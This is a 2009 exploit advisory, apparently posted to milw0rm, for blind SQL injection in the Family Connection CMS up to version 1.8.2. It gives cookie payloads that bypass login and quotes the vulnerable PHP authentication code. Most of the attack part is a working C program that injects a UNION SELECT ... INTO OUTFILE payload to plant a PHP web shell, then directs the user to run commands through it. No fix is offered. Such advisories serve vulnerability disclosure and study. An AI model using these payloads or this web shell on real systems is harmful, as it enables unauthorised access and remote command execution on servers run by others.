@@ -1,0 +1,219 @@
+*******   Salvatore "drosophila" Fresta   *******
+
+[+] Application: Family Connection
+[+] Version: <= 1.8.2
+[+] Website: http://www.familycms.com
+
+[+] Bugs: [A] Blind SQL Injection
+
+[+] Exploitation: Remote
+[+] Date: 1 Apr 2009
+
+[+] Discovered by: Salvatore "drosophila" Fresta
+[+] Author: Salvatore "drosophila" Fresta
+[+] Contact: e-mail: drosophilaxxx@gmail.com
+
+
+*************************************************
+
+[+] Menu
+
+1) Bugs
+2) Code
+3) Fix
+
+
+*************************************************
+
+[+] Bugs
+
+
+- [A] Blind SQL Injection
+
+[-] File affected: inc/util_inc.php
+
+Usually an SQL injection vulnerability located in the
+authentication system allows a guest to bypass it, and
+this is just what happens using the following cookie:
+
+Cookie name: fcms_login_id
+Cookie content: -1 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,'admin','password',12,13,14,15,16,17,18,19,20,21,22
+Cookie server: localhost (change it)
+Cookie path: /
+
+Cookie name: fcms_login_uname
+Cookie content: admin
+Cookie server: localhost (change it)
+Cookie path: /
+
+Cookie name: fcms_login_pw
+Cookie content: password
+Cookie server: localhost (change it)
+Cookie path: /
+
+Anyway the values contained in the previous cookies 
+are used also by other functions and queries and so 
+is not possible to surf on the vulnerable website 
+with such permissions because the CMS interrupts the 
+sessions each time a SQL error is encountered.
+For this reason the possibility to write the result 
+of the SQL queries on the files is handy to bypass 
+this limitation.
+
+The follows is the vulnerable code:
+
+...
+
+elseif (isset($_COOKIE['fcms_login_id'])) {
+	if (isLoggedIn($_COOKIE['fcms_login_id'], $_COOKIE['fcms_login_uname'], $_COOKIE['fcms_login_pw'])) {
+		$_SESSION['login_id'] = $_COOKIE['fcms_login_id'];
+		$_SESSION['login_uname'] = $_COOKIE['fcms_login_uname'];
+		$_SESSION['login_pw'] = $_COOKIE['fcms_login_pw'];
+	}
+	
+...
+
+in util_inc.php:
+
+function isLoggedIn ($userid, $username, $password) {
+	$result = mysql_query("SELECT * FROM `fcms_users` WHERE `id` = $userid LIMIT 1") or die('<h1>Login Error (util.inc.php 275)</h1>' . mysql_error());
+	if (mysql_num_rows($result) > 0) {
+		$r = mysql_fetch_array($result);
+		if ($r['username'] !== $username) { return false; } elseif ($r['password'] !== $password) { return false; } else { return true; }
+	} else {
+		return false;
+	}
+}
+
+
+*************************************************
+
+[+] Code
+
+
+- [A] Blind SQL Injection
+
+/*
+
+	Family Connection <= 1.8.2 - Remote Command Execution
+	
+	Proof of Concept - Written by Salvatore "drosophila" Fresta
+
+	The following software will create a file (rce.php) in the
+	specified path using Blind SQL Injection bug. To exec remote
+	commands, you must open the file using a browser.
+	
+*/	
+
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <unistd.h>
+#include <netdb.h>
+
+int socket_connect(char *server, int port) {
+
+	int fd;
+	struct sockaddr_in sock;
+	struct hostent *host;
+	
+	memset(&sock, 0, sizeof(sock));
+	
+	if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) return -1;
+	
+	sock.sin_family = AF_INET;
+	sock.sin_port = htons(port);
+	
+	if(!(host=gethostbyname(server))) return -1;
+	
+	sock.sin_addr = *((struct in_addr *)host->h_addr);
+	
+	if(connect(fd, (struct sockaddr *) &sock, sizeof(sock)) < 0) return -1;
+	
+	return fd;
+   
+}
+
+int socket_send(int socket, char *buffer, size_t size) {
+	
+	if(socket < 0) return -1;
+
+	return write(socket, buffer, size) < 0 ? -1 : 0;
+	
+}
+
+void usage(char *bn) {
+
+	printf("\n\nFamily Connection <= 1.8.2 - Remote Command Execution\n"
+			"Proof of Concept - Written by Salvatore \"drosophila\" Fresta\n\n"
+			"usage: %s <server> <path> <fs path>\n"
+			"example: %s localhost /fcms/ /var/www/htdocs/fcms/\n\n", bn, bn);	
+
+}
+
+int main(int argc, char *argv[]) {
+	
+	int sd;
+	char code[] = "'<?php echo \"<pre>\"%3b system($_GET[cmd])%3b echo \"</pre><br><br>\"%3b?>'",
+		*buffer; 
+	
+	if(argc < 4) {
+		usage(argv[0]);
+		return -1;
+	}
+	
+	if(!(buffer = (char *)calloc(216+strlen(argv[1])+strlen(argv[2])+strlen(argv[3]), sizeof(char)))) {
+		perror("calloc");
+		return -1;
+	}
+	
+	sprintf(buffer,	"GET %shome.php HTTP/1.1\r\n"
+					"Host: %s\r\n"
+					"Cookie: fcms_login_id=-1 UNION ALL SELECT %s,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 INTO OUTFILE '%srce.php'#\r\n\r\n",
+					argv[2], argv[1], code, argv[3]);
+					
+	printf("\n[*] Connecting...");
+	
+	if((sd = socket_connect(argv[1], 80)) < 0) {
+		perror("[-] Connection failed");
+		free(buffer);
+		return -1;
+	}
+	
+	printf("\n[+] Connected"
+			"\n[*] Sending...");
+	
+	if(socket_send(sd, buffer, strlen(buffer)) < 0) {
+		perror("[-] Sending failed");
+		free(buffer);
+		return -1;
+	}
+	
+	printf("\n[+] Sent\n\n"
+			"Open your browser and  try to connect to http://%s%srce.php?cmd=ls\n\n", argv[1], argv[2]);
+			
+	recv(sd, buffer, 1, 0);
+	
+	close(sd);
+	free(buffer);
+	
+	printf("[+] Connection closed\n\n");
+	
+	return 0;
+	
+}
+
+
+*************************************************
+
+[+] Fix
+
+No fix.
+
+
+*************************************************
+
+# milw0rm.com [2009-03-30]
